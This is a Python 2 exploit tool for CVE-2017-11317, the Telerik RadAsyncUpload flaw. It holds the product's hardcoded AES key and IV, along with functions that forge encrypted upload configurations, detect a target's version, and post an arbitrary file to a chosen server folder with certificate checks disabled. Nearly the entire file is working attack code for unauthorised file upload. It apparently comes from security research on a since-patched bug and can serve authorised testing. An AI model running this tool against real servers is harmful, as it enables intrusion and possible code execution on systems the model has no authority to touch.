#!/usr/bin/python2

# Paul Taylor / Forgenix Ltd
# Telerik fixed in June 2017 by removing default keys in R2 2017 SP1 (2017.2.621) and providing the ability to disable the RadAsyncUpload feature in R2 2017 SP2 (2017.2.711)
# http://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security

# To do - if version number starts with 2017.1.118 (R1 2017), 2017.1.228 (R1 2017 SP1), or 2017.2.503 (R2 2017) then include the Encrypt-then-MAC hmac in TargetFolder and TempTargetFolder

import sys
import base64
import json
import re
import requests
from Crypto.Cipher import AES

# Warning, the below prevents certificate warnings, and verify = False in the later code prevents them being verified
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class RAUCipher:
    key = "\xEB\x8A\xF9\x0F\xDE\x30\xFE\xCB\xE3\x30\xE8\x07\xCF\x0B\x42\x52\xA4\x4E\x9F\x06\xA2\xEA\x4A\xF1\x0B\x04\x6F\x59\x8D\xD3\xEA\x0C"
    iv = "\xE3\x30\xE8\x07\xCF\x0B\x42\x52\x55\xA3\xA5\x61\xA7\x07\xD2\x69"

    @staticmethod
    def encrypt(plaintext):
        sys.stderr.write("Encrypting... ")
        encoded = ""
        for i in plaintext:
            encoded = encoded + i + "\x00"
        plaintext = encoded + (chr(16 - (len(encoded) % 16)) * (16 - (len(encoded) % 16)))
        cipher = AES.new(RAUCipher.key, AES.MODE_CBC, RAUCipher.iv)
        sys.stderr.write("done\n")
        return base64.b64encode(cipher.encrypt(plaintext))

    @staticmethod
    def decrypt(ciphertext):
        sys.stderr.write("Decrypting... ")
        ciphertext = base64.b64decode(ciphertext)
        cipher = AES.new(RAUCipher.key, AES.MODE_CBC, RAUCipher.iv)
        unpad = lambda s: s[0:-ord(s[-1])]
        sys.stderr.write("done\n")
        return unpad(cipher.decrypt(ciphertext[0:]))[0::2]


def rauPostData_prep(quiet, TempTargetFolder, Version):
    TempTargetFolder = RAUCipher.encrypt(TempTargetFolder)

# To do - if version number starts with 2017.1.118 (R1 2017), 2017.1.228 (R1 2017 SP1), or 2017.2.503 (R2 2017) then include the Encrypt-then-MAC hmac in TargetFolder and TempTargetFolder

    rauJSONplaintext = '{"TargetFolder":"jgas0meSrU/uP/TPzrhDTw==","TempTargetFolder":"' + TempTargetFolder + '","MaxFileSize":0,"TimeToLive":{"Ticks":1440000000000,"Days":0,"Hours":40,"Minutes":0,"Seconds":0,"Milliseconds":0,"TotalDays":1.6666666666666666,"TotalHours":40,"TotalMinutes":2400,"TotalSeconds":144000,"TotalMilliseconds":144000000},"UseApplicationPoolImpersonation":false}'
    if not quiet:
        print "JSON: " + rauJSONplaintext + "\n"
    rauPostData = RAUCipher.encrypt(rauJSONplaintext) + "&"
    rauVersionplaintext = "Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version=" + Version + ", Culture=neutral, PublicKeyToken=121fae78165ba3d4"
    if not quiet:
        print "Version: " + rauVersionplaintext + "\n"
    rauPostData += RAUCipher.encrypt(rauVersionplaintext)
    return rauPostData


def getVersion(url):
    sys.stderr.write("Contacting server... ")
    response = requests.get(url, verify=False)
    html = response.text
    sys.stderr.write("done\n")
    match = re.search('((?<=\<\!-- )20\d{2}(.\d+)+(?= --\>))|(?<=Version%3d)20\d{2}(.\d+)+(?=%2c)|(?<=Version=)20\d{2}(.\d+)+(?=,)', html)

    if match:
        return match.group(0)
    else:
        return "No version result"


def payload(TempTargetFolder, Version, payload_filename):
    sys.stderr.write("file: " + payload_filename + "\n")
    sys.stderr.write("version: " + Version + "\n")
    sys.stderr.write("destination " + TempTargetFolder + "\n")
    sys.stderr.write("Preparing payload... \n")
    payload_file = open(payload_filename, "r")
    payload_file_data = payload_file.read()
    payload_file.close()
    quiet = True

    data = "-----------------------------68821516528156\r\n"
    data = data + "Content-Disposition: form-data; name=\"rauPostData\"\r\n"
    data = data + "\r\n"
    data = data + rauPostData_prep(quiet, TempTargetFolder, Version) + "\r\n"
    data = data + "-----------------------------68821516528156\r\n"
    data = data + "Content-Disposition: form-data; name=\"file\"; filename=\"blob\"\r\n"
    data = data + "Content-Type: application/octet-stream\r\n"
    data = data + "\r\n"
    data = data + payload_file_data
    data = data + "-----------------------------68821516528156\r\n"
    data = data + "Content-Disposition: form-data; name=\"fileName\"\r\n"
    data = data + "\r\n"
    data = data + "fgx_testing.bypass\r\n"
    data = data + "-----------------------------68821516528156\r\n"
    data = data + "Content-Disposition: form-data; name=\"contentType\"\r\n"
    data = data + "\r\n"
    data = data + "text/html\r\n"
    data = data + "-----------------------------68821516528156\r\n"
    data = data + "Content-Disposition: form-data; name=\"lastModifiedDate\"\r\n"
    data = data + "\r\n"
    data = data + "2017-06-28T09:11:28.586Z\r\n"
    data = data + "-----------------------------68821516528156\r\n"
    data = data + "Content-Disposition: form-data; name=\"metadata\"\r\n"
    data = data + "\r\n"
    data = data + "{\"TotalChunks\":1,\"ChunkIndex\":0,\"TotalFileSize\":1,\"UploadID\":\"" + payload_filename + "\"}\r\n"
    data = data + "-----------------------------68821516528156--\r\n"
    data = data + "\r\n"
    sys.stderr.write("Payload prep done\n")
    return data


def upload(TempTargetFolder, Version, payload_filename, url):
    sys.stderr.write("Preparing to upload to " + url + "\n")
    session = requests.Session()
    request = requests.Request('POST', url, data=payload(TempTargetFolder, Version, payload_filename))
    request = request.prepare()
    request.headers["Content-Type"] = "multipart/form-data; boundary=---------------------------68821516528156"
    response = session.send(request, verify=False)
    sys.stderr.write("Upload done\n")
    return response.text


def decode_rauPostData(rauPostData):
    rauPostData = rauPostData.split("&")
    rauJSON = RAUCipher.decrypt(rauPostData[0])
    decoded = "\nJSON: " + rauJSON + "\n"
    TempTargetFolder = json.loads(rauJSON)["TempTargetFolder"]
    decoded = decoded + "\nTempTargetFolder = " + RAUCipher.decrypt(TempTargetFolder) + "\n"
    rauVersion = RAUCipher.decrypt(rauPostData[1])
    decoded = decoded + "\nVersion: " + rauVersion + "\n"
    return decoded


def mode_decrypt():
    # decrypt ciphertext
    ciphertext = sys.argv[2]
    print "\n" + RAUCipher.decrypt(ciphertext) + "\n"


def mode_Decrypt_rauPostData():
    # decrypt rauPostData
    rauPostData = sys.argv[2]
    print decode_rauPostData(rauPostData)


def mode_encrypt():
    # encrypt plaintext
    plaintext = sys.argv[2]
    print "\n" + RAUCipher.encrypt(plaintext) + "\n"


def mode_Encrypt_rauPostData():
    # encrypt rauPostData based on TempTargetFolder and Version
    quiet = False
    TempTargetFolder = sys.argv[2]
    Version = sys.argv[3]
    print "rauPostData: " + rauPostData_prep(quiet, TempTargetFolder, Version) + "\n"


def mode_encrypt_rauPostData_Quiet():
    # as per -E but just output encrypted rauPostData, not the prepared JSON and version
    quiet = True
    TempTargetFolder = sys.argv[2]
    Version = sys.argv[3]
    print rauPostData_prep(quiet, TempTargetFolder, Version)


def mode_version():
    # extract Telerik web ui version details from url
    url = sys.argv[2]
    print getVersion(url)


def mode_payload():
    # generate a payload based on TempTargetFolder, Version and payload file
    TempTargetFolder = sys.argv[2]
    Version = sys.argv[3]
    payload_filename = sys.argv[4]
    print payload(TempTargetFolder, Version, payload_filename)


def mode_Post():
    # generate and upload a payload based on TempTargetFolder, Version, payload file and url
    TempTargetFolder = sys.argv[2]
    Version = sys.argv[3]
    payload_filename = sys.argv[4]
    url = sys.argv[5]
    print upload(TempTargetFolder, Version, payload_filename, url)


def mode_help():
    print "Usage:"
    print ""
    print "Decrypt a plaintext:		-d ciphertext"
    print "Decrypt rauPostData:		-D rauPostData"
    print "Encrypt a plaintext:		-e plaintext"
    print "Generate rauPostData:		-E TempTargetFolder Version"
    print "Generate rauPostData (quiet):	-Q TempTargetFolder Version"
    print "Version from HTTP response:	-v url"
    print "Generate a POST payload:	-p TempTargetFolder Version filename"
    print "Upload a payload:		-P TempTargetFolder Version filename url"
    print


sys.stderr.write("\nRAU_crypto by Paul Taylor / Foregenix Ltd.\n")
sys.stderr.write("CVE-2017-11317 - Telerik RadAsyncUpload hardcoded keys / arbitrary file upload\n\n")

if len(sys.argv) < 2:
    mode_help()
elif sys.argv[1] == "-d" and len(sys.argv) == 3:
    mode_decrypt()
elif sys.argv[1] == "-D" and len(sys.argv) == 3:
    mode_Decrypt_rauPostData()
elif sys.argv[1] == "-e" and len(sys.argv) == 3:
    mode_encrypt()
elif sys.argv[1] == "-E" and len(sys.argv) == 4:
    mode_Encrypt_rauPostData()
elif sys.argv[1] == "-Q" and len(sys.argv) == 4:
    mode_encrypt_rauPostData_Quiet()
elif sys.argv[1] == "-v" and len(sys.argv) == 3:
    mode_version()
elif sys.argv[1] == "-p" and len(sys.argv) == 5:
    mode_payload()
elif sys.argv[1] == "-P" and len(sys.argv) == 6:
    mode_Post()
else:
    mode_help()
